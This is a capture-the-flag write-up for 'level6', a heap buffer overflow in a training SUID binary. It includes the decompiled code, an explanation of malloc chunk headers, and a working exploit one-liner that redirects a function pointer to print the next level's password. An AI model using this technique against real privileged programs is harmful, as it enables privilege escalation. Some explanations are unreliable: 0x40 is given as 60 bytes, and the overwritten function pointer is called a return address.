# Level6
Level6 let's us delve a little deeper on how malloc works

# Tools

# Walkthrough
The home of level6 contains a binary, `level6`. We retrieve it using scp and analyse it using dogbolt.

The binary has the SUID bit, and is owned by level7.

It reveals the 3 interesting functions:
```c
void main(undefined4 param_1,int param_2)
{
  char *__dest;
  code **ppcVar1;
  
  __dest = (char *)malloc(0x40);
  ppcVar1 = (code **)malloc(4);
  *ppcVar1 = m;
  strcpy(__dest,*(char **)(param_2 + 4));
  (**ppcVar1)();
  return;
}
```
The main function calls the `malloc` that allocates 0x40 = 60 bytes of memory. On that allocated block, `strcpy` is used to write the content of the first argument passed to the program. As `strcpy` doesn't check if what's going to be written in the buffer is small enough to fit, we can perform a heap buffer overflow by writing something big enough to overflow.

```c
void n(void)

{
  system("/bin/cat /home/user/level7/.pass");
  return;
}


void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)
{
  puts("Nope");
  return;
}
```
`m` is called to print "Nope", and `n` is the function we want to execute. 
Using `info functions` on GDB, we can get the address of `n`, `0x08048454`


At first glance, we could think that, has we malloc 64 bytes, malloc will allocate 64 bytes and we will then be able to put the return address to esily overflow.
Actually, `malloc` allocates 8 more bytes. The 4 first bytes are for free, when the remaining 4 bytes contain the size of the malloced block, as well as if it has been freed or not. The block system is used to make memory management easier. See the Resources at the end of the document. 

To make our exploit work, instead of writing 64 bytes for padding, we thus need to write 72 bytes to overwrite the return address. 

```bash
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
```


# Resources
[Understaning malloc and free](https://www.cs.princeton.edu/courses/archive/fall06/cos217/lectures/14Memory-2x2.pdf)
[The process thought around malloc](https://courses.engr.illinois.edu/cs241/sp2012/lectures/09-malloc.pdf)
[LiveOverflow Heap Overflow](https://www.youtube.com/watch?v=HPDBOhiKaD8)